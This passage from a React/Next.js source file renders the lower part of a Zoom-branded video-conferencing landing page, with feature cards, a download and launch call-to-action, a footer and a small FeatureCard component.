              <Link href="/dashboard">
                <Button variant="link" className="text-blue-1 text-lg p-0 h-auto hover:underline">
                  Or launch Zoom in your browser →
                </Button>
              </Link>
            </div>
          </div>

          <div className="relative hidden lg:block">
            <div className="relative w-full h-[500px] rounded-3xl overflow-hidden shadow-2xl">
              <Image
                src="/images/hero-background.png"
                alt="Video conferencing preview"
                fill
                className="object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-dark-1/80 to-transparent" />
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="container mx-auto px-6 py-20">
        <div className="text-center mb-16">
          <h2 className="text-4xl lg:text-5xl font-bold text-white mb-4">
            Built for modern teams
          </h2>
          <p className="text-xl text-gray-400">
            Everything you need to stay connected and productive
          </p>
        </div>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
          {/* Feature Cards */}
          <FeatureCard
            icon={<Video size={32} />}
            title="HD Video & Audio"
            description="Crystal clear video and audio quality for seamless communication"
          />
          <FeatureCard
            icon={<Users size={32} />}
            title="Unlimited Participants"
            description="Host meetings with unlimited participants, no restrictions"
          />
          <FeatureCard
            icon={<Shield size={32} />}
            title="Secure & Private"
            description="End-to-end encryption to keep your conversations private"
          />
          <FeatureCard
            icon={<Calendar size={32} />}
            title="Schedule Meetings"
            description="Plan ahead with easy meeting scheduling and calendar integration"
          />
          <FeatureCard
            icon={<Share2 size={32} />}
            title="Screen Sharing"
            description="Share your screen to collaborate effectively with your team"
          />
          <FeatureCard
            icon={<Monitor size={32} />}
            title="Cross-Platform"
            description="Available on desktop, mobile, and web - work from anywhere"
          />
        </div>
      </section>

      {/* CTA Section */}
      <section className="container mx-auto px-6 py-20">
        <div className="bg-gradient-to-r from-blue-1 to-purple-1 rounded-3xl p-12 text-center">
          <h2 className="text-4xl font-bold text-white mb-4">
            Ready to get started?
          </h2>
          <p className="text-xl text-white/90 mb-8">
            Join millions of users who trust Zoom for their video conferencing needs
          </p>
          <div className="flex flex-wrap justify-center gap-4">
            <Button
              onClick={handleDownload}
              className="bg-white text-blue-1 hover:bg-gray-100 px-8 py-6 text-lg"
            >
              <Download size={20} className="mr-2" />
              Download for Windows
            </Button>
            <Link href="/dashboard">
              <Button className="bg-dark-1 text-white hover:bg-dark-3 px-8 py-6 text-lg">
                Launch Web App
              </Button>
            </Link>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="container mx-auto px-6 py-12 border-t border-dark-3">
        <div className="flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-2">
            <Image
              src="/icons/logo.svg"
              width={32}
              height={32}
              alt="Zoom logo"
            />
            <span className="text-xl font-bold text-white">Zoom</span>
          </div>
          <p className="text-gray-500 text-center">
            © 2025 Zoom. All rights reserved.
          </p>
          <div className="flex gap-6">
            <Link href="#" className="text-gray-500 hover:text-blue-1 transition">
              Privacy
            </Link>
            <Link href="#" className="text-gray-500 hover:text-blue-1 transition">
              Terms
            </Link>
            <Link href="#" className="text-gray-500 hover:text-blue-1 transition">
              Support
            </Link>
          </div>
        </div>
      </footer>
    </div>
  );
};

const FeatureCard = ({ icon, title, description }: { icon: any; title: string; description: string }) => {
  return (
    <div className="bg-dark-1 border border-dark-3 rounded-2xl p-8 hover:border-blue-1/50 transition-all hover:transform hover:scale-105">
      <div className="w-14 h-14 bg-blue-1/10 rounded-xl flex items-center justify-center text-blue-1 mb-4">
        {icon}
      </div>
      <h3 className="text-xl font-bold text-white mb-2">{title}</h3>
      <p className="text-gray-400 leading-relaxed">{description}</p>
    </div>
  );
};

export default LandingPage;

